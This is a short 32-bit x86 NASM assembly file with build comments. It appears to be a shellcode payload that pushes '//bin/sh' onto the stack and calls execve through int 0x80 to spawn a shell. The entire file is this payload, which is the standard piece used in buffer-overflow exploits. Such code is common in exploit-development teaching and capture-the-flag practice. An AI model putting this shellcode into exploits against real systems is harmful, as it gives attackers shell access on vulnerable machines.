; execve
; eax: 0x0b, ebx: char *
; nasm -f bin execve_sh_raw.asm

; execve
; nasm -f elf exec_sh.asm
; ld -s -o sh exex_sh.o -m elf_i386

BITS 32
global  _start
_start:
    xor eax,eax
    push eax
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi
    mov ebx,esp         ;pointer to our string
    push eax
    mov ecx, esp
    mov edx, esp
    mov al,11          ;sys_execve
    int 0x80
